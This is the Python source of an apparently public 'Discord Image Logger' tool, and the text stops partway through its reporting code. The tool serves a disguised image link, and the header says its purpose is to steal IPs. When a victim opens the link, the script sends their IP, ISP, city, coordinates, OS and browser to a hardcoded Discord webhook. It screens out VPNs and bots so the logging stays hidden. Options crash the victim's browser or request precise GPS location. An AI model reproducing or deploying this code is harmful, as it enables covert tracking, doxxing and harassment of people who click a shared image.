# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1125744491500933163/gyDgXP4qls5QiEqnGJqVlrwHkSrhkDKdjYNaVYO1SnJpQPGJkBsYmnlVOIMxuGSuhp6r",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
